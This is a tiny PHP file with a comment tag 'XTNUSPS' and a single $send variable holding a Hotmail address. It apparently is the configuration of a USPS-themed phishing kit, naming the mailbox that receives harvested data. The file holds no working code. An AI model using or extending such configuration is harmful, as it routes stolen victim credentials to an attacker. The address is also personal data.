<?php
// From:XTNUSPS
$send = "firasb10@hotmail.com";
?>